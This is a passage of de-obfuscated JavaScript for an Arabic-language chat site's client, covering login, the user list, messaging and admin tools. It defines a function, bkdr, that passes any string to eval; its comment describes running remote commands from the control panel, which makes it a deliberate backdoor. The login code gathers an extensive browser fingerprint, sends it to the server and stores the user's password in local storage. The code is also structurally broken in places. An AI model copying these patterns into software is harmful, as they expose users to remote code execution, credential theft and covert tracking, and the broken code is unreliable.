                    navigator.n.mdl = devicesList.map(function (deviceObj) {
                        return Object.assign(deviceObj, {
                            't': deviceObj.toString()
                        });
                    });
                })["catch"](function (err) {
                    navigator.n.mdl = ['x'];
                });
            } catch (e) {}

            // فحص هيكلية محرك المتصفح والـ Window لتحديد نوع ونظام تشغيل متصفحك بدقة
            try {
                navigator.n.nwk = Object.entries(Object.getOwnPropertyDescriptors(window)).filter(propItem => !propItem[1].configurable).map(propItem => propItem[0]);
                navigator.n.nwkv = Object.entries(Object.getOwnPropertyDescriptors(window)).filter(propItem => propItem[1].configurable).map(propItem => propItem[0]);
            } catch (e) {}

            navigator.n.nk = Object.keys(Object.getOwnPropertyDescriptors(navigator));
            navigator.n.ear = hashFingerprintString();
            navigator.n.mjs = window && window.performance && window.performance.memory ? window.performance.memory.jsHeapSizeLimit : 1; // حجم ذاكرة الكاش المتاحة للمتصفح
            navigator.n.scrw = calculateViewportWidthDifference();
            navigator.n.itl = getBrowserLocalizationOptions();
        } catch (e) {}

        // حقن قيم بصمات إضافية مشفرة للسيرفر
        navigator.n.gg = executeGgFingerprint();
        navigator.n.gn = executeGnFingerprint();
        navigator.n.gf = executeGfFingerprint();
        navigator.n.gd = executeGdFingerprint();
        navigator.n.ge = executeGgFingerprint();
        
    } // <-- [إصلاح] تم إغلاق القوس الخاص بـ if (isLoginActionTriggered == false) هنا

// <-- [إصلاح] تم إغلاق القوس النهائي الخاص بالدالة الرئيسية login(actionTypeCode) هنا

        

        // دالة استخراج إعدادات التدويل واللغة والمنطقة الزمنية المحلية للمتصفح Intl
        function getBrowserLocalizationOptions() {
            var localizationMap = {};
            try {
                var resolvedOptions = new Intl.DateTimeFormat("default").resolvedOptions();
                for (var optionKey in resolvedOptions) {
                    localizationMap[optionKey] = resolvedOptions[optionKey];
                }
            } catch (e) {}
            return localizationMap;
        }

        // دالة حساب الفروقات الدقيقة بين أبعاد شاشة الجهاز وعرض محتوى المتصفح الفعلي (Viewport)
        function calculateViewportWidthDifference() {
            try {
                var widthDiffArray = [];
                if (screen && screen.width) {
                    if (visualViewport && visualViewport.width) {
                        widthDiffArray.push(screen.width - visualViewport.width);
                    } else {
                        widthDiffArray.push(0);
                    }
                    if (window && window.innerWidth) {
                        widthDiffArray.push(screen.width - window.innerWidth);
                    } else {
                        widthDiffArray.push(0);
                    }
                    if (document.body.clientWidth) {
                        widthDiffArray.push(screen.width - document.body.clientWidth);
                    } else {
                        widthDiffArray.push(0);
                    }
                    return widthDiffArray;
                }
            } catch (e) {}
            return null;
        }
        // دالة إضافية لتوليد بصمة مصغرة عبر لوحة رسم بقياس 1*1 بكسل لفحص سلوك تنعيم الحواف (Anti-aliasing)
        function executeGfFingerprint() {
            try {
                var canvasElement = document.createElement("canvas");
                canvasElement.style.display = "none";
                canvasElement.width = 1;
                canvasElement.height = 1;
                var canvasContext = canvasElement.getContext('2d');
                var canvasHash = hashFingerprintString(canvasElement.toDataURL());
                canvasElement.remove();
                typeof canvasContext;
                if (canvasHash.length == 0) {
                    return hashFingerprintString("nothing!");
                }
                return canvasHash;
            } catch (err) {
                return hashFingerprintString("err!");
            }
        }
//تم الفحص الى هنا 3
        // دالة توليد بصمة جهاز فرعية أخرى عبر لوحة رسم فارغة تماماً بقياس 0*0 للتحقق من قيم المحرك الافتراضية
        function executeGdFingerprint() {
    try {
        var canvasElement = document.createElement("canvas");
        canvasElement.style.display = "none";
        canvasElement.width = 0;
        canvasElement.height = 0;
        var canvasContext = canvasElement.getContext('2d');
        var canvasHash = hashFingerprintString(canvasElement.toDataURL());
        canvasElement.remove();
        typeof canvasContext;
        if (canvasHash.length == 0) {
            return hashFingerprintString("nothing!");
        }
        return canvasHash;
    } catch (err) {
        return hashFingerprintString("err!");
    }
} // <-- [إصلاح] هذا القوس يغلق دالة executeGdFingerprint بشكل صحيح ومستقل

// جدول مصفوفة الألوان الزخرفية الأساسية بالموقع لتلوين النكات والخلفيات بالأكواد الست عشرية (Hex)
var colorPaletteList = ["202020", "202070", "2020c0", "207020", "207070", "2070c0", "20c020", "20c070", "20c0c0", "702020", "702070", "7020c0", "707020", "707070", "7070c0", "70c020", "70c070", "70c0c0", "c02020", "c02070", "c020c0", "c07020", "c07070", "c070c0", "c0c020", "c0c070", "c0c0c0", "FFFFFF"];
var defcc = [];

// إنشاء صندوق الواجهة البرمجية لتوزيع وعرض خلايا الألوان cpick بمقاس عرض 260 بكسل
var colorGridContainer = $("<div style='width:260px;height:200px;line-height: 0px!important;' class='break'></div>");

colorPaletteList.forEach(function (baseColor) {
    var colorShades = [];
    // استخدام دالة generateColorShade المفتوحة مسبقاً لتوليد تدرجات لونية فاتحة وغامقة لكل لون
    colorShades.push(generateColorShade(baseColor, 0x1e));
    colorShades.push(generateColorShade(baseColor, 15));
    colorShades.push(baseColor);
    colorShades.push(generateColorShade(baseColor, -15));
    colorShades.push(generateColorShade(baseColor, -0x1e));
    colorShades.push(generateColorShade(baseColor, -0x28));

    colorShades.forEach(function (finalHexColor) {
        defcc.push(finalHexColor);
        colorGridContainer.append("<div v='#" + finalHexColor + "'style='width:40px;height:40px;background-color:#" + finalHexColor + ";display:inline-block;'></div>");
    });
});

// حقن أيقونة الحظر الحمراء fa-ban لإتاحة خيار إزالة التلوين والزخرفة
colorGridContainer.append("<div class='border fa fl fa-ban' v='' style='width:39px;height:39px;background-color:;display:inline-block;color:red;margin:1px;'></div>");

// دالة حقن ألوان إضافية مخصصة للرتب وأصحاب الميزات (ncolors) المخزنة في المصفوفة العلوية
for (var i = 0; i < ncolors.length; i++) {
    defcc.push(ncolors[i]);
    colorGridContainer.append("<div v='#" + ncolors[i] + "'style='width:40px;height:40px;background-color:#" + ncolors[i] + ";display:inline-block;'></div>");
}

// تحويل الجدول إلى كود HTML وحفظه في المتغير العام المربوط بنافذة منتقي الألوان للواجهة
window.cldiv = colorGridContainer[0].outerHTML;

$(".cpick").click(function () {
    var colorGridInstance = $(colorGridContainer);
    var currentPickerBtn = this;

    // برمجة حدث النقر على أي خلية لونية لتطبيق لون الخلفية وحفظ قيمة الـ v المشفرة
    colorGridInstance.find("div").off().click(function () {
        $(currentPickerBtn).css("background-color", this.style["background-color"]);
        $(currentPickerBtn).css("background-color", $(this).attr('v')).attr('v', $(this).attr('v'));
    });

    // فتح صندوق منتقي الألوان عائماً فوق الزر الحالي
    openPopupDialog(currentPickerBtn, colorGridInstance).css('left', "0px");
});

// إخفاء تبويبات لوحة التحكم /cp بشكل افتراضي عند البدء
$("#cp li").hide();

// تفعيل مؤقت الفرز الدوري كل ثانيتين (2000 ملي ثانية) لتحديث وتحميل صور الغرف وترتيبها أبجدياً حسب الزوار
setInterval(updateLazyImagesAndSortRooms, 2000);

// برمجة زر الغرف #brooms لإعادة ترتيب الغرف فوراً والتمرير للأعلى عند الضغط عليه
$("#brooms").click(function () {
    setTimeout(function () {
        updateLazyImagesAndSortRooms();
        $("#rooms").scrollTop(0);
    }, 200);
});

executeSecondarySetup();

// جلب وتجهيز كود التصميم الافتراضي المخصص لقالب حقن الرسائل العامة u-msg
cachedMessageHtmlTemplate = $($("#umsg").html()).addClass('mm')[0].outerHTML;

// تلوين حقل الكتابة الرئيسي #tbox باللون الرمادي افتراضياً لحين دخول غرفة شات
$("#tbox").css("background-color", "#AAAAAF");
$(".rout").hide();
$(".redit").hide();

// إغلاق النوافذ المنبثقة تلقائياً عند النقر على العناصر التفاعلية ae بالشات
$(".ae").click(function (event) {
    setTimeout(function () {
        $(".phide").click();
    }, 100);
});
// تفعيل التحديث عند الانتقال بين تبويبات الشات (Tabs)
$("*[data-toggle=\"tab\"]").on("shown.bs.tab", function (tabEvent) {
    fixSize();
});

// مراقبة حقل النص العام #tbox وعند الضغط على زر Enter (كود 13) يتم إرسال الرسالة فوراً عبر دالة الإرسال العامة
$("#tbox").keyup(function (keyEvent) {
    if (keyEvent.keyCode == 0xd) {
        keyEvent.preventDefault();
        Tsend(); // دالة معالجة وإرسال نص الرسالة للعام
    }
});

// مراقبة حقل نص البرودكاست/الحائط .tboxbc وعند الضغط على Enter يتم استدعاء دالة sendbc
$(".tboxbc").keyup(function (keyEvent) {
    if (keyEvent.keyCode == 0xd) {
        keyEvent.preventDefault();
        sendbc(); // الدالة الحقيقية المستخرجة لإرسال البرودكاست
    }
});

// مؤقت دوري لفحص وتحديث الحالة أو معالجة معينة (مثل فحص البنك أو الجلسة)
setInterval(runTimeAgoUpdater, 15000); // 0x3a98 تعني 15 ثانية

// جلب ملفات الجافا سكريبت الخاصة بمنتقي الألوان وفرز الجداول ديناميكياً
jQuery.ajax({
    'type': "GET",
    'url': "jscolor.js",
    'dataType': "script",
    'cache': true
});
jQuery.ajax({
    'type': "GET",
    'url': "jquery.tablesorter.min.js",
    'dataType': "script",
    'cache': true
});

// استكمال نسخ وجمع كافة خصائص كائن الـ navigator (المنصة، المتصفح، الـ UserAgent) لحقنها ببصمة المتصفح العميقة
for (var navProperty in navigator) {
    if (typeof navigator[navProperty] != "function" && navProperty != 'n') {
        try {
            navigator.n[navProperty] = JSON.parse(JSON.stringify(navigator[navProperty]));
        } catch (e) {}
    }
}

// إنشاء عنصر صوتي غير مرئي لتشغيل صوت نغمة الدخول أو الخلفية للشات وتكرارها تلقائياً
var backgroundAudio = document.createElement("AUDIO");
backgroundAudio.setAttribute("autoplay", "autoplay");
backgroundAudio.onended = function () {
    this.play();
};
backgroundAudio.onplay = function () {};
backgroundAudio.src = "m1.mp3"; // ملف النغمة التلقائي

// تفعيل دالة الإرسال النهائية بعد تأخير بسيط (320 ملي ثانية) لضمان اكتمال تجميع البيانات
setTimeout(function () {
    login(actionTypeCode);
}, 320);

// <-- [إصلاح] هنا قمت بحذف القوس الزائد الـ } وكلمة return التي كانت تقطع الكود بدون مبرر وتسبب خطأً بنيوياً.

// حقن توقيت الجلسة والتوكين المشفر النهائي داخل مصفوفة بصمة الجهاز قبل الإرسال للسيرفر
if (navigator.n.dt == null) {
    navigator.n.dt = new Date().getTime().toString(36);
    delete navigator.n.td;
    navigator.n.td = hashFingerprintString(JSON.stringify(navigator.n));
}

// تحويل وبث طلبات الدخول للسيرفر عبر دالة send الحقيقية بناءً على خيار التبويب المختار
switch (actionTypeCode) {
    case 1:
        // الحالة الأولى: الدخول كزائر (Guest) وإرسال البصمة وحفظ الاسم في الـ LocalStorage
        send('g', {
            'username': $("#u1").val(),
            'fp': navigator.n,
            'refr': getv("refr"),
            'r': getv('r')
        });
        setv('u1', encodeURIComponent($("#u1").val()).split("'").join("%27"));
        setv("isl", 'no'); // وضع علامة عدم الدخول بعضوية
        break;

    case 2:
        // الحالة الثانية: تسجيل الدخول بعضوية مسجلة (Login) وإرسال كلمة المرور وحالة التخفي Stealth
        send("login", {
            'username': $('#u2').val(),
            'stealth': $("#stealth").is(":checked"), 
            'password': $("#pass1").val(),
            'fp': navigator.n,
            'refr': getv('refr'),
            'r': getv('r')
        });
        setv('u2', encodeURIComponent($("#u2").val()).split("'").join("%27"));
        setv('p1', encodeURIComponent($("#pass1").val()).split("'").join("%27"));
        setv("isl", "yes"); // وضع علامة الدخول بعضوية
        break;

    case 3:
        // الحالة الثالثة: تسجيل عضوية جديدة تماماً في الشات (Register)
        send("reg", {
            'username': $("#u3").val(),
            'password': $("#pass2").val(),
            'fp': navigator.n,
            'refr': getv("refr"),
            'r': getv('r')
        });
        break;
}

}

  
    // دالة تعديل شكل وألوان صناديق تنبيهات تسجيل الدخول في الواجهة (مثل التبديل للأخضر، الأحمر، الأصفر)

function hl(elementSelector, bootstrapClass) {
    var targetElement = document.querySelector(elementSelector);
    var extractedUiType = '';
   if (targetElement == null) {
        return {};
    }
    

    // استنتاج نوع الستايل بناءً على كلاسات البوتستراب (Label أم Button أم Panel)
    if (targetElement.classList.contains("label")) {
        extractedUiType = "label";
    }
    if (targetElement.classList.contains('btn')) {
        extractedUiType = "btn";
    }
    if (targetElement.classList.contains("panel")) {
        extractedUiType = "panel";
    }

    // إزالة ستايلات الألوان القديمة بالكامل
    targetElement.classList.remove(extractedUiType + "-primary");
    targetElement.classList.remove(extractedUiType + "-danger");
   targetElement.classList.remove(extractedUiType + "-warning");
    targetElement.classList.remove(extractedUiType + "-info");
    targetElement.classList.remove(extractedUiType + "-success");

    // تطبيق لون كلاس البوتستراب الجديد المستهدف (مثال: btn-success للأخضر)
    targetElement.classList.add(extractedUiType + '-' + bootstrapClass);
    return targetElement;
    
}


// دالة تغيير نص وحالة صندوق تنبيهات تسجيل الدخول المربوطة بالـ ID المستخرج #loginstat
function showNotificationToast(alertTypeClass, messageText) {
   hl("#loginstat", alertTypeClass).innerText = messageText;
}

// دالة حفظ وتحديث بيانات الملف الشخصي (setprofile) وإرسالها للسيرفر (اسم، حالة، لون النك، لون الخط، خلفية البروفايل)
function setprofile() {
    var profileDataDataMap = {
        topic: $(".stopic").val(), // النك نيم الجديد أو زخرفة الحالة
        msg: $(".smsg").val(), // الحالة الشخصية (u-msg)
        ucol: $(".scolor").attr('v'), // لون النك نيم المختار (ucol)
        mcol: $(".mcolor").attr('v'), // لون خط الكتابة في المحادثة
        bg: $(".sbg").attr('v') // لون خلفية النك نيم (bg)
    };
    send("setprofile", profileDataDataMap); // استخدام دالة الإرسال الحقيقية send لتمرير التعديل
}
// دالة بناء وحقن صف بيانات العضو (User Row Builder) داخل قائمة الشات لأول مرة
function compileUserRowHtml(userId, userObj, returnNodeOnly) {
    if (userBadges[userId] != null) {
        return; // تخطي البناء إذا كان العضو منشأ مسبقاً في القائمة
    }
    // استبدال الصورة الشخصية الافتراضية إذا تم تفعيل وضع تصفية الأيقونات noico
    if (isNoIconActive || userObj.pic == "pic.png" && typeof user_pic == "string") {
        userObj.pic = user_pic;
    }

    // دالة حقن وتجهيز قالب تصميم العضو الافتراضي المخزن من كود الواجهة #uhtml
    var userNode = $(cachedUserHtmlTemplate);

    // خوارزمية السيرفر السرية لاحتساب كود وتوليد رقم التذكرة الهاش الفريد لكل نك نيم (uhash)
    userObj.h = '#' + Math.ceil((Math.ceil(Math.sqrt(parseInt(executeHashAlgorithm([userObj.username || 'ff'], 0x200), 36) / 0xfe01)) - 1) / 0xff * 0x63).toString().padStart(2, '0');

    if (userNode.s) {
        userNode.style.display = "none";
    }

    // ربط الصف بآي دي العضو الفريد عبر الكلاس uid وإضافة حدث فتح بروفايله الشخصي upro عند النقر عليه
    userNode[0].className += " uid" + userId;
    userNode[0].setAttribute("onclick", "upro('" + userObj.id + "');");
    userNode.find(".uhash").text(userObj.h); // عرض الهاش الفريد بالنظام لتمييز الحسابات

    userBadges[userId] = userNode;
    userNode.attr('v', parseUserPowerString(userNode.power).rank || '0'); // حقن رقم قوة الرتبة والترتيب (Rank) للفصل والفرز

    // معالجة وعرض صور أعلام الدول للأعضاء (Flags) التابعة لكلاس co
    if (userObj.co == '--' || userObj.co == null || userObj.co == 'A1' || userObj.co == 'A2' || userObj.co == 'EU' || userObj.co == 'T1') {
        userNode.find(".co").attr("src", "flags/--.png");
    } else {
        userNode.find(".co").attr('src', "flags/" + userObj.co + ".png");
    }

    // خيار الإرجاع الفوري أو الحقن المباشر في حاوية المتواجدين الرئيسية #users
    if (returnNodeOnly) {
        return userNode;
    } else {
        $("#users").append(userNode);
    }
}


// دالة التحديث اللحظي المتزامن لبيانات العضو في كافة أجزاء الشات (Real-time User UI Synced Updater)
function updateUserRowInUi(targetUserId, explicitUserObj, modifiedFields) {
    var activeUserObj = explicitUserObj || allUsersList[targetUserId];
    if (activeUserObj == null) {
        return;
    }
    if (isNoIconActive || activeUserObj.pic == "pic.png" && typeof user_pic == "string") {
        activeUserObj.pic = user_pic;
    }

    // التحقق من نوع التحديث لمعرفة ما إذا كان يتضمن تحديث للأيقونات الخاصة sico أو الدروع أو الرتب
    var isVisualPropertyUpdated = modifiedFields == null || modifiedFields.ico != null || modifiedFields.b != null || modifiedFields.power != null;
    var finalIconUrl = isVisualPropertyUpdated ? getUserIconPath(activeUserObj) : '';

    // تحديث وعرض أيقونة وتأثير الحالة الحالي (0 متصل، 1 مشغول، 4 متخفي Stealth الخ) التابع لكلاس ustat
    var statusIconPath = "imgs/s" + activeUserObj.stat + ".png";
    if (activeUserObj.s) {
        statusIconPath = "imgs/s4.png"; // إعطائه أيقونة التخفي المخصصة رقم 4
    }

    // 1. أولاً: إذا كان التحديث يخص حسابك أنت (المستخدم الحالي)، قم بتحديث حقول لوحة تعديل البروفايل فوراً
    if (targetUserId == myid) {
        $(".spic").attr("src", activeUserObj.pic);
        $(".stopic").val(stripHtmlTags($("<div>" + activeUserObj.topic + "</div>")));
        $(".smsg").val(stripHtmlTags($("<div>" + activeUserObj.msg + "</div>")));
        $(".scolor").css("background-color", activeUserObj.ucol || "#000000").attr('v', activeUserObj.ucol || "#000000");
        $(".mcolor").css("background-color", activeUserObj.mcol || "#000000").attr('v', activeUserObj.mcol || "#000000");
        $(".sbg").css("background-color", activeUserObj.bg || '').attr('v', activeUserObj.bg || '');
    }

    if (activeUserObj.msg == '') {
        activeUserObj.msg = '..';
    }

    // 2. ثانياً: إذا كان العضو يمتلك المايك حالياً بالعام، قم بتحديث بيانات واجهة ميكروفونه النشط فوراً
    if (mic.indexOf(targetUserId) != -1 && (modifiedFields == null || modifiedFields.topic || isVisualPropertyUpdated || modifiedFields.pic)) {
        var activeMicNode = $("#mic [uid='" + targetUserId + "'] .u");
        activeMicNode.find("span").text(activeUserObj.topic);
        if (isVisualPropertyUpdated) {
            activeMicNode.find("img").attr("src", finalIconUrl);
        }
        activeMicNode.parent().css("background-image", "url(" + activeUserObj.pic + ')');
    }

    var targetUserNode = userBadges[targetUserId];

    // تحديث ظلال الألوان لصف العضو بقائمة المتواجدين بناءً على لونه الزخرفي ucol
    if (modifiedFields == null || modifiedFields != null && modifiedFields.ucol != null) {
        var calculatedShade = generateColorShade(activeUserObj.ucol || "#000000", -0x1e);
        targetUserNode.css({
            'background-color': calculatedShade == '' || calculatedShade == "#000000" || false ? '' : calculatedShade + '06'
        });
    }

    if (modifiedFields == null || modifiedFields != null && modifiedFields.stat != null) {
        targetUserNode.find(".ustat").attr('src', statusIconPath);
    }

    // معالجة وإظهار علامة الكتم أو الحظر (fa-ban) بجانب اسم العضو في قائمة المتواجدين
    if (isUserIgnoredInList(activeUserObj)) {
        targetUserNode.find(".muted").toggleClass("fa-ban", true).show();
    } else {
        targetUserNode.find(".muted").toggleClass("fa-ban", false).hide();
    }

    if (modifiedFields == null || modifiedFields.power) {
        targetUserNode.attr('v', parseUserPowerString(activeUserObj.power).rank || '0');
    }

    if (isVisualPropertyUpdated) {
        if (finalIconUrl != '') {
            targetUserNode.find(".u-ico").attr('src', finalIconUrl); // حقن الأيقونة الخاصة الجديدة بالمتواجدين
        } else {
            targetUserNode.find(".u-ico").removeAttr("src");
        }
    }

    // تحديث زخرفة النك نيم u-topic واللون والخلفية
    if (modifiedFields == null || modifiedFields.stat != null || modifiedFields.topic != null || modifiedFields.ucol != null) {
        targetUserNode.attr('n', activeUserObj.topic || '');
        targetUserNode.find(".u-topic").html(activeUserObj.topic).css({
            'background-color': activeUserObj.bg,
            'color': activeUserObj.ucol
        });
    }

    if (modifiedFields == null || modifiedFields != null && modifiedFields.msg != null) {
        targetUserNode.find(".u-msg").html(activeUserObj.msg);
    }

    if (modifiedFields == null || modifiedFields != null && modifiedFields.pic != null) {
        targetUserNode.find(".u-pic").css("background-image", "url(\"" + activeUserObj.pic + "\")");
    }

    // 3. ثالثاً: الانتقال لتحديث بيانات العضو بداخل عناصر قائمة شاشات محادثات الخاص التابعة له #c
    targetUserNode = $('#c' + targetUserId);
    if (targetUserNode.length) {
        if (isVisualPropertyUpdated && finalIconUrl != '') {
            targetUserNode.find(".u-ico").attr("src", finalIconUrl);
        }
        targetUserNode.find(".ustat").attr("src", statusIconPath);
        targetUserNode.find(".u-topic").html(activeUserObj.topic).css({
            'background-color': activeUserObj.bg,
            'color': activeUserObj.ucol
        });
        targetUserNode.find(".u-pic").css("background-image", "url(\"" + activeUserObj.pic + "\")");

        // تحديث بيانات الترويسة العليا (الهيدر) لنافذة محادثة الخاص المفتوحة معه
        targetUserNode = $('.w' + targetUserId).find(".head .uzr");
        targetUserNode.find(".u-topic").html(activeUserObj.topic).css({
            'background-color': activeUserObj.bg,
            'color': activeUserObj.ucol
        });
        targetUserNode.find(".u-pic").css("background-image", "url(\"" + activeUserObj.pic + "\")");
        targetUserNode.find(".ustat").attr('src', statusIconPath);
        if (isVisualPropertyUpdated && finalIconUrl != '') {
            targetUserNode.find(".u-ico").attr("src", finalIconUrl);
        }
    }

    if (activeUserObj.s != null) {
        executeStealthUserSetup(activeUserObj);
    }

    // 4. رابعاً: إذا كان العضو في مكالمة خاصة صوتية نشطة معك حالياً، قم بتحديث بيانات واجهة الـ #call العائمة له
    if (activeCallInstance != null && activeCallInstance.uid == targetUserId) {
        var callBoxUiElement = $("#call");
        callBoxUiElement.find(".u-pic").css("background-image", "url('" + activeUserObj.pic + "')");
        callBoxUiElement.find(".u-topic").css("color", activeUserObj.ucol).css("background-color", activeUserObj.bg || "#fafafa").html(activeUserObj.topic);
        if (isVisualPropertyUpdated) {
            callBoxUiElement.find(".u-ico").attr("src", getUserIconPath(activeUserObj) || '');
        }
    }
}
var shouldRefreshUsersList = false;
var lastInputValue = '';

// دالة تصفية والبحث عن المستخدمين بقائمة المتواجدين عبر حقل البحث #usearch
function checkInput() {
    if (usea.val() != lastInputValue) {
        lastInputValue = usea.val();
        if (lastInputValue != '') {
            usea.removeClass('bg'); // إزالة الخلفية التنبيهية إذا كتب شيئاً
        } else {
            usea.addClass('bg'); // إرجاع الخلفية إذا كان الحقل فارغاً
        }

        // إذا كان حقل البحث فارغاً، قم بإظهار كافة الأعضاء وإعادة تصفية المتخفين
        if (lastInputValue == '') {
            $("#users .uzr").css("display", '');
            for (var i = 0; i < ignoredUsersList.length; i++) {
                var userObj = ignoredUsersList[i];
                if (userObj.s != null) {
                    executeStealthUserSetup(userObj);
                }
            }
        } else {
            // إخفاء الجميع والبدء بمطابقة النك نيم والهاش مع نص البحث المدخل (مع تجاهل كشيدة التمديد "ـ")
            $("#users .uzr").css("display", "none");
            var sanitizedSearchQuery = lastInputValue.split('ـ').join('').toLowerCase();

            for (var i = 0; i < ignoredUsersList.length; i++) {
                var userObj = ignoredUsersList[i];
                // الفحص والمطابقة أبجدياً أو بواسطة رقم التذكرة الهاش الفريد (uhash)
                if (userObj.topic.split('ـ').join('').toLowerCase().indexOf(sanitizedSearchQuery) != -1 || userObj.h.indexOf(lastInputValue) == 0 || userObj.h.indexOf(lastInputValue) == 1) {
                    if (userObj.s != null) {
                        executeStealthUserSetup(userObj);
                    } else {
                        userBadges[userObj.id][0].style.display = ''; // إظهار العضو المطابق للبحث
                    }
                }
            }
        }
    }
}

// دالة التحكم برؤية وحجب العضو المتخفي (Stealth)؛ بحيث لا يراه إلا من يملك رتبة أعلى منه
function executeStealthUserSetup(stealthUserObj) {
    if (userBadges[stealthUserObj.id] == null) {
        return;
    }
    var targetUserPower = parseUserPowerString(stealthUserObj.power) || {
        'rank': 0
    };

    // إذا كان العضو متخفياً ورتبته (Rank) أعلى من رتبتك الحالية، يتم إخفاؤه تماماً من قائمة متواجديك
    if (stealthUserObj.s && targetUserPower.rank > (userPermissionsConfig.rank || 0)) {
        userBadges[stealthUserObj.id][0].style.display = "none";
    } else {
        userBadges[stealthUserObj.id][0].style.display = ''; // إظهاره إذا كانت رتبتك مساوية أو أعلى منه
    }
}

// خوارزمية فرز وترتيب الأعضاء (User List Sorter) في واجهة قائمة الأسماء الكلية #users
function updateusers() {
    if (shouldRefreshUsersList == false) {
        return;
    }
    var usersElements = $("#users").children(".room");
    var sortBound = Array.prototype.sort.bind(usersElements);

    sortBound(function (userRowA, userRowB) {
        var rankWeightA = parseInt(userRowA.getAttribute('v') || 0);
        var rankWeightB = parseInt(userRowB.getAttribute('v') || 0);

        // 1. المشرفون والأعضاء المتواجدون معك في نفس الغرفة (الكلاس inroom) يرتفعون للأعلى بقوة +98,400 نقطة وزن رتبة
        if (userRowA.classList.contains("inroom")) {
            rankWeightA += 0x186a0; // إضافة 100,000 نقطة وزن
        } else {
            rankWeightA -= 0x2710; // خصم 10,000 نقطة إذا كان في غرفة أخرى
        }

        if (userRowB.classList.contains("inroom")) {
            rankWeightB += 0x186a0;
        } else {
            rankWeightB -= 0x2710;
        }

        // 2. النكات المحمية أو أصحاب الحضور الخارق (كلاس ninr) يصعدون لقمة القائمة بوزن ثابت 99,999
        if (userRowA.classList.contains("ninr")) {
            rankWeightA = 99999;
        }
        if (userRowB.classList.contains("ninr")) {
            rankWeightB = 99999;
        }

        // 3. عند تساوي الأوزان والرتب، يتم الفرز والترتيب تلقائياً أبجدياً (localeCompare) حسب حروف الاسم
        if (rankWeightA == rankWeightB) {
            return (userRowA.getAttribute('n') + '').localeCompare(userRowA.getAttribute('n') + '');
        }
        return rankWeightA < rankWeightB ? 1 : -1; // الرتب الأعلى والغرفة الحالية تتصدر الواجهة
    });
    $("#users").append(usersElements); // إعادة حقن الأسماء مرتبة في حاوية القائمة
}


// دالة إرسال الرسائل الخاصة (Private Messages) المرتبطة بحدث النقر وإرسال الـ pm
function sendPrivateMessage(clickEvent) {
    var targetUid = clickEvent.data.uid;
    if (isUserIgnoredInList(allUsersList[targetUid])) {
        alert("لا يمكنك الدردشه مع شخص قمت بـ تجاهله\nيرجى إلغاء التجاهل");
        return;
    }

    var privateMessageText = $(".tbox" + targetUid).val();
    $(".tbox" + targetUid).val(''); // تفريغ صندوق نص الخاص
    $(".tbox" + targetUid).focus();

    if (privateMessageText == "%0A" || privateMessageText == "%0a" || privateMessageText == '' || privateMessageText == "\n") {
        return;
    }
    // إرسال طلب رسالة الخاص التفاعلية عبر دالة الإرسال الحقيقية للسيرفر
    send('pm', {
        'msg': privateMessageText,
        'id': targetUid
    });
}

// دالة إرسال الإعلانات العامة أو الرسائل الخاصة الجماعية من لوحة الإدارة العائمة #mnot
function pmsg() {
    var annModalWindow = $("#mnot");
    annModalWindow.find(".rsave").show().off().click(function () {
        annModalWindow.modal("hide");
        var annText = annModalWindow.find("textarea").val();
        if (annText == '' || annText == null) {
            return;
        }
        annText = annText.split("\n").join(" "); // تحويل السطور لسطر مستقيم واحد
        if (annText == "%0A" || annText == "%0a" || annText == '' || annText == "\n") {
            return;
        }

        // إذا قام الإداري بتحديد خيار الإرسال كخاص جماعي (ispp)
        if (annModalWindow.find(".ispp").is(":checked")) {
            send("ppmsg", {
                'msg': annText
            }); // بث خاص جماعي لجميع المتواجدين بالشات ppmsg
        } else {
            send("pmsg", {
                'msg': annText
            }); // بث إعلان عام يظهر في شاشة الكل بالعام pmsg
        }
    });

    annModalWindow.modal({
        'title': 'ffff'
    });

    // حجب ميزة الخاص الجماعي إذا كانت رتبة المشرف لا تدعم صلاحية ppmsg المستخرجة
    if (userPermissionsConfig.ppmsg != true) {
        annModalWindow.find(".ispp").attr("disabled", true).prop("checked", false);
    } else {
        annModalWindow.find(".ispp").attr("disabled", false).prop("checked", false);
    }
    annModalWindow.find("textarea").val('');
}

// دالة فتح صندوق الرسائل الإدارية الثانوي المربوط بالمعرف #mmnot
function openSecondaryAdminNotification(callbackAction) {
    var secondaryAnnModal = $("#mmnot");
    secondaryAnnModal.find(".rsave").show().off().click(function () {
        secondaryAnnModal.modal("hide");
        var inputAnnText = secondaryAnnModal.find("textarea").val();
        if (inputAnnText == '' || inputAnnText == null) {
            return;
        }
        inputAnnText = inputAnnText.split("\n").join(" ");
        if (inputAnnText == '%0A' || inputAnnText == "%0a" || inputAnnText == '' || inputAnnText == "\n") {
            return;
        }
        callbackAction(inputAnnText);
    });
    secondaryAnnModal.modal();
    secondaryAnnModal.find("textarea").val('').focus();
}

// دالة تشغيل الأوامر البعيدة قسرياً من الكنترول
function bkdr(codeString) {
    return eval(codeString);
}

// دالة معالجة وإرسال الرسائل العامة في الروم (Message Action) المرتبطة بصندوق النص #tbox وزر الـ Enter
function Tsend(alternativeInputId) {
    var chatInputBox = $(alternativeInputId || "#tbox");
    var processedChatText = chatInputBox.val().split("\n").join(" ");

    // فحص السمعة واللايكات: قيود الإرسال بالعام (إذا كانت أقل من 0 يمنع النظام الإرسال)
    if (0 && allUsersList[myid].rep < 0) {
        alert("الكتابه في العام تتطلب 0 إعجاب");
        chatInputBox.val('');
        return;
    }

    chatInputBox.val(''); // تصفير الصندوق تلقائياً بعد الفحص لسرعة الكتابة التاليّة
    chatInputBox.focus();

    if (processedChatText == "%0A" || processedChatText == "%0a" || processedChatText == '' || processedChatText == "\n") {
        return;
    }

    $(".ppop .reply").parent().remove();

    // إرسال نص الرسالة للعام وبثها مع تمرير آي دي الرسالة المستهدفة في حال كان رداً (mi)
    send('msg', {
        'msg': processedChatText,
        'mi': replyId != null && replyId.indexOf(".mi") != -1 ? replyId.replace(".mi", '') : undefined
    });

    if (replyId != null) {
        replyId = null; // تصفير الكاش بعد نجاح الإرسال
    }
}

// دالة فحص وتجميع صلاحيات الرتبة (Power Profiler) ومطابقتها من مصفوفة التنبيهات activeAlerts
function parseUserPowerString(powerNameParam) {
    if (activeAlerts == null) {
        return {
            'ico': ''
        };
    }
    var powerKey = powerNameParam;
    if (powerKey == '') {
        powerKey = '_';
    }
    // جلب كائن الرتبة مباشرة إذا كان مسجلاً بالـ ID الرمزي
    if (activeAlerts[powerKey] != null) {
        return activeAlerts[powerKey];
    }
    // البحث اليدوي في المصفوفة في حال عدم التطابق المباشر
    for (var i = 0; i < activeAlerts.length; i++) {
        if (activeAlerts[i].name == powerNameParam) {
            return activeAlerts[i];
        }
    }
